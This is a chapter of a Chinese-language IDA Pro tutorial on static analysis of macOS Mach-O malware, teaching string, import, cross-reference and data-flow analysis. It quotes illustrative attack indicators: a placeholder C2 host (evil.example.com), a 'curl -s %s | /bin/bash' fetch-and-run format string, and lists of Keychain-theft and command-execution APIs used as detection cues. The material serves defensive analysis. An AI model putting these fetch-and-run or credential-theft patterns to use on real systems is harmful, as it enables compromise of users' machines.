# 第五章：静态分析方法论

[返回目录](ida-pro-malware-analysis-guide.md) | [上一章](ch04-ida-pro-basics.md)

---

> 前四章建立了基础知识。从本章开始，我们进入实际的分析方法论——面对一个未知的 Mach-O 恶意样本，如何系统地提取信息、理解行为、还原意图。

---

## 5.1 分析思路总览

静态分析的目标是在**不运行样本**的情况下，尽可能多地理解其行为。分析流程可以概括为：

```
    ┌──────────────┐
    │  快速 Triage  │ ← 文件类型、哈希、签名、字符串速览
    └──────┬───────┘
           ▼
    ┌──────────────┐
    │  入口点分析   │ ← _main / constructor / +load 方法
    └──────┬───────┘
           ▼
    ┌──────────────┐
    │  字符串分析   │ ← URL、路径、密钥、命令、错误信息
    └──────┬───────┘
           ▼
    ┌──────────────┐
    │  导入表分析   │ ← 可疑 API 调用 → 行为推断
    └──────┬───────┘
           ▼
    ┌──────────────┐
    │  函数级深入   │ ← Xref 追踪、控制流图阅读、数据流追踪
    └──────┬───────┘
           ▼
    ┌──────────────┐
    │  整合输出     │ ← IOC 提取、行为报告、检测规则
    └──────────────┘
```

---

## 5.2 从入口点开始

### 标准可执行文件的入口点

对于 `MH_EXECUTE` 类型的 Mach-O：

1. **`Ctrl+E`** 跳转到入口点
2. 通常是 `_main` 函数
3. 按 `F5` 查看反编译代码

```c
// 典型的恶意软件 main 函数模式
int main(int argc, char **argv) {
    // 1. 环境检查（反调试/反虚拟机）
    if (is_debugger_present())
        return 0;

    // 2. 初始化配置（可能涉及解密）
    decrypt_config();

    // 3. 执行恶意行为
    install_persistence();
    exfiltrate_data();

    // 4. 与 C2 通信
    beacon_loop();

    return 0;
}
```

### 非标准入口点

恶意软件可能不从 `_main` 开始执行：

| 入口方式 | 查找方法 | 说明 |
|---------|---------|------|
| `__attribute__((constructor))` | 搜索 `__mod_init_func` section | 在 `_main` 之前执行 |
| ObjC `+load` 方法 | 搜索字符串 `load`，查看 ObjC 类方法列表 | 类被加载时自动调用 |
| `+initialize` 方法 | 同上 | 类首次收到消息时调用 |
| dylib constructor | 查看 `LC_ROUTINES_64` 或 `__mod_init_func` | dylib 被加载时执行 |

**操作步骤：查找 constructor**

1. `Shift+F7` 打开 Segments 窗口
2. 找到 `__DATA.__mod_init_func` section
3. 双击跳转，这里存储的是函数指针数组
4. 每个指针指向一个 constructor 函数
5. 双击函数指针进入对应函数

---

## 5.3 字符串分析

字符串是恶意软件分析中最直接的信息来源。

### 打开 Strings 窗口

1. `Shift+F12` 打开 Strings 窗口
2. 右键 → **Setup** 配置字符串识别参数：
   - Minimum string length: 5（减少噪音）
   - 勾选 C-style (ASCII)
   - 勾选 Unicode (UTF-16)
   - 勾选所有段（不仅仅是 `__TEXT`）

### 字符串分类与关注点

**网络相关**：
```
http://evil.example.com/beacon    ← C2 服务器地址
https://api.telegram.org/bot      ← Telegram Bot API（常见 C2 通道）
Mozilla/5.0 ...                   ← User-Agent 伪装
POST /upload                      ← 数据外传路径
Content-Type: application/json    ← HTTP 头
```

**文件系统相关**：
```
/Library/LaunchAgents/            ← 持久化路径
~/Library/Application Support/    ← 数据存储路径
/tmp/.hidden_payload              ← 临时文件
.plist                            ← 配置文件后缀
```

**命令执行相关**：
```
/bin/bash                         ← Shell 执行
/bin/sh -c                        ← Shell 命令
curl                              ← 下载工具
osascript                         ← AppleScript 执行器
chmod +x                          ← 赋予执行权限
launchctl load                    ← 加载 LaunchAgent
```

**加密/编码相关**：
```
AES                               ← 加密算法标识
BEGIN RSA                         ← RSA 密钥
base64                            ← 编码方式
ABCDEFGHIJKLMNOPQRSTUVWXYZabc... ← Base64 字符表
```

**系统信息收集**：
```
sw_vers                           ← macOS 版本
system_profiler                   ← 系统信息
whoami                            ← 当前用户
hostname                          ← 主机名
ifconfig                          ← 网络接口
```

### 加密字符串的识别

如果 Strings 窗口中看到的字符串不多或内容看起来像乱码，很可能字符串被加密了：

```
; 加密字符串的典型特征
db 0x3F, 0x2A, 0x15, 0x6B, 0x4E, 0x22, 0x57, 0x10  ; 看起来像随机字节
; 但它被传递给了一个"解密函数"：
lea     rdi, encrypted_data
mov     esi, 8
call    sub_100001234      ; ← 这可能是字符串解密函数
; RAX 返回解密后的明文字符串
```

识别字符串解密函数的线索：
1. 被大量不同位置调用（高扇入）
2. 参数通常是一个数据指针 + 长度
3. 函数内部有 XOR、循环、查表等操作
4. 返回值通常被传递给系统 API（如网络函数）

> 字符串解密是逆向分析的常见任务，第七章 IDAPython 会教你如何编写脚本批量自动化解密。

---

## 5.4 导入表分析

### 按功能分类审查导入

在 Imports 窗口中，按照恶意行为类别系统审查：

**进程/命令执行**：

| API | 所属框架 | 恶意用途 |
|-----|---------|---------|
| `NSTask` / `Process` | Foundation | 执行外部命令 |
| `system()` | libSystem | 执行 shell 命令 |
| `popen()` | libSystem | 执行命令并读取输出 |
| `posix_spawn()` | libSystem | 创建新进程 |
| `execve()` | libSystem | 替换当前进程映像 |
| `NSAppleScript` | Foundation | 执行 AppleScript |

**文件操作**：

| API | 所属框架 | 恶意用途 |
|-----|---------|---------|
| `NSFileManager` | Foundation | 文件读写删除复制 |
| `open() / write() / read()` | libSystem | 底层文件 I/O |
| `fopen() / fwrite()` | libSystem | C 标准文件 I/O |
| `NSData writeToFile:` | Foundation | 将数据写入文件 |

**网络通信**：

| API | 所属框架 | 恶意用途 |
|-----|---------|---------|
| `NSURLSession` | Foundation | HTTP/HTTPS 请求 |
| `CFSocketCreate` | CoreFoundation | 底层 socket |
| `connect() / send() / recv()` | libSystem | POSIX socket |
| `getaddrinfo()` | libSystem | DNS 解析 |
| `res_query()` | libresolv | DNS 查询（DNS 隧道） |

**Keychain / 凭据**：

| API | 所属框架 | 恶意用途 |
|-----|---------|---------|
| `SecKeychainFindGenericPassword` | Security | 读取 Keychain 密码 |
| `SecKeychainItemCopyContent` | Security | 复制 Keychain 条目 |
| `SecItemCopyMatching` | Security | 搜索 Keychain 条目 |

**动态加载**：

| API | 所属框架 | 恶意用途 |
|-----|---------|---------|
| `dlopen()` | libdyld | 运行时加载动态库 |
| `dlsym()` | libdyld | 运行时解析函数符号 |
| `NSBundle loadAndReturnError:` | Foundation | 加载插件 bundle |

### 操作步骤：从导入追踪到行为

1. 在 Imports 窗口中找到可疑 API（如 `_system`）
2. 双击跳转到其在 IDA 中的位置
3. 按 `X` 查看交叉引用——谁调用了 `_system`？
4. 双击引用跳转到调用处
5. 按 `F5` 反编译调用函数
6. 分析传入的参数（通常是要执行的命令字符串）

---

## 5.5 交叉引用（Xrefs）的高效使用

### Xref 是连接一切的纽带

在 IDA 分析中，Xref 回答两个核心问题：

- **谁调用了我？**（对函数按 `X`）→ 找到调用者，理解触发条件
- **我调用了谁？**（在函数体内查看 `call` 指令）→ 理解函数行为

### 实战 Xref 链追踪

假设你在 Strings 中发现了一个 C2 URL：

```
"https://evil.example.com/api/beacon"
```

追踪链条：

```
字符串 "https://evil.example.com/api/beacon"
    ↓ Xref: 在 sub_100001500 中被引用
    ↓
sub_100001500 (重命名为: build_c2_request)
    ↓ Xref: 被 sub_100001800 调用
    ↓
sub_100001800 (重命名为: beacon_loop)
    ↓ Xref: 被 _main 调用
    ↓
_main
```

通过这条链，你就理解了从程序启动到 C2 通信的完整路径。

### Xref 图（Xref Graph）

IDA 可以生成函数调用图：

1. `View > Graphs > Function calls`（从当前函数出发的调用图）
2. `View > Graphs > Xrefs to`（谁调用了当前函数的图）
3. `View > Graphs > Xrefs from`（当前函数调用了谁的图）

对于复杂样本，调用图可以帮你快速建立函数间的全局关系。

### Proximity View

`View > Open subviews > Proximity view` 提供了一种交互式的关系图，显示当前函数与其关联函数的关系，可以动态展开。

---

## 5.6 控制流图（CFG）阅读技巧

IDA 的 Graph View（空格键切换）将函数展示为控制流图。

### 基本块与箭头

- **基本块**（Basic Block）：一段没有分支的连续代码
- **绿色箭头**：条件为 True 的路径（跳转发生）
- **红色箭头**：条件为 False 的路径（跳转不发生，继续执行）
- **蓝色箭头**：无条件跳转

### 常见 CFG 模式

**简单 if-else**：
```
     ┌─────┐
     │ cmp │
     └──┬──┘
    T┌──┘└──┐F
     ▼      ▼
   ┌───┐  ┌───┐
   │ A │  │ B │
   └─┬─┘  └─┬─┘
     └──┬───┘
        ▼
     ┌─────┐
     │ end │
     └─────┘
```

**循环**（有回边的结构）：
```
     ┌─────────┐
     │  init   │
     └────┬────┘
          ▼
     ┌─────────┐ ←─────┐
     │  cond   │        │ 回边（back edge）
     └──┬───┬──┘        │
     T  │   │ F         │
        ▼   ▼           │
     ┌────┐ ┌────┐      │
     │body│ │exit│      │
     └──┬─┘ └────┘      │
        └───────────────┘
```

**switch-case**（多路分支）：
```
        ┌──────┐
        │switch│
        └──┬───┘
     ┌───┬─┤─┬───┐
     ▼   ▼ ▼ ▼   ▼
   ┌──┐┌──┐┌──┐┌──┐┌──────┐
   │c0││c1││c2││c3││default│
   └──┘└──┘└──┘└──┘└──────┘
```

### CFG 阅读技巧

1. **先看形状**：循环的标志是回边（向上的箭头），if-else 是菱形分叉后合并
2. **关注出口条件**：函数的 `ret` 指令在哪些路径上？错误处理路径通常直接 return
3. **识别错误处理**：短的分支路径通常是错误处理（返回 NULL、-1、打印错误信息）
4. **先跟踪主路径**：从入口到主要功能的最长路径通常是核心逻辑

---

## 5.7 数据流追踪

数据流追踪是理解"数据从哪里来，到哪里去"的过程。

### 前向追踪（Forward Tracking）

从数据产生处出发，追踪它被传递到哪里：

```nasm
; 数据从哪里来？
call    _CFHTTPMessageCopyBody   ; ← RAX = HTTP 响应体
mov     rbx, rax                 ; 保存到 RBX

; 数据被传递到哪里？
mov     rdi, rbx                 ; 第一个参数
lea     rsi, aRW                 ; "rw" (文件模式)
call    _fopen                   ; ← 写入文件！
```

### 后向追踪（Backward Tracking）

从可疑操作出发，回溯参数的来源：

```nasm
; 可疑操作：调用 system()
call    _system                  ; ← RDI 是什么？
; 向上追踪 RDI 的来源
mov     rdi, [rbp+command_str]   ; 来自局部变量
; 继续向上追踪 command_str 是怎么赋值的
lea     rdi, format_str          ; "curl -s %s | /bin/bash"
mov     rsi, [rbp+url]           ; URL 参数
call    _sprintf                 ; ← 拼接命令字符串
```

### 在 IDA 中进行数据流追踪

1. 在某个变量或寄存器上右键 → **Highlight**（或按 `Alt+M`）
2. 同名的变量/寄存器在整个函数中会高亮显示
3. 在 Hex-Rays 反编译视图中，右键变量 → **Rename**（跟踪更直观）
4. 使用 `X` 查看数据交叉引用（r = read, w = write）

---

## 5.8 构建分析笔记

每次分析都应该产出结构化的笔记。建议模板：

```markdown
# 样本分析笔记

## 基本信息
- 文件名：sample_001.bin
- SHA-256：abcdef1234...
- 文件类型：Mach-O 64-bit executable x86_64
- 文件大小：125,440 bytes
- 签名状态：Ad-hoc signed

## 行为摘要
- 功能分类：后门（Backdoor）
- 持久化方式：LaunchAgent
- C2 通信：HTTPS POST to evil.example.com
- 数据窃取：浏览器密码、Keychain

## 关键函数
| 地址 | 重命名 | 功能描述 |
|------|--------|---------|
| 0x100001234 | decrypt_config | XOR 解密 C2 配置 |
| 0x100001500 | install_launchagent | 写入 LaunchAgent plist |
| 0x100001800 | steal_keychain | 读取 Keychain 密码 |
| 0x100002000 | beacon_to_c2 | HTTPS POST 上报数据 |

## IOC（Indicators of Compromise）
- C2 URL: https://evil.example.com/api/beacon
- 文件路径: ~/Library/LaunchAgents/com.apple.update.plist
- User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)

## 检测规则
- YARA 规则：（见附件）
- 文件系统检测：检查是否存在 com.apple.update.plist
```

---

## 本章小结

- 静态分析遵循"快速 triage → 入口点 → 字符串 → 导入 → 深入 → 整合"的流程
- 字符串分析是最快获取线索的方式，注意识别加密字符串的模式
- 导入表按功能分类审查，每个可疑 API 通过 Xref 追踪到具体用途
- Xref 是串联分析的核心能力，掌握正向和反向追踪
- 控制流图先看形状（循环/分支），再读细节
- 数据流追踪回答"数据从哪来，到哪去"
- 每次分析都要产出结构化笔记

---

[<< 上一章：IDA Pro 界面与核心操作](ch04-ida-pro-basics.md) | [下一章：Hex-Rays 反编译器 >>](ch06-hex-rays-decompiler.md)
